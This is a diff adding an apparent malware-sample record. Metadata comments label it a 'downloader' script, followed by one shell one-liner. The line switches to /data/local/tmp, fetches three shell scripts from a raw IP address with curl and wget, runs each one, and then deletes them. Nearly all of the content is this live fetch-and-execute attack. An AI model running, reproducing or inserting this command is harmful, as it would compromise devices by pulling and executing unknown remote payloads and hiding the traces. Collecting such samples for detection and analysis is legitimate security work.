@@ -1,0 +1,10 @@
+# sha256: 76ed6740df194a3a18886f1f761675a668e852dc677d85bf3548bf8da6256913
+# family: downloader
+# kind: script
+# size_bytes: 227
+# first_seen: 2026-08-31 07:12:34.476000 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+cd /data/local/tmp/; curl -O http://160.250.181.124/b4k9zp.sh; sh b4k9zp.sh; busybox wget http://160.250.181.124/a7m2qx.sh; sh a7m2qx.sh; wget http://160.250.181.124/c8r3nv.sh; sh c8r3nv.sh; rm -rf a7m2qx.sh b4k9zp.sh c8r3nv.sh
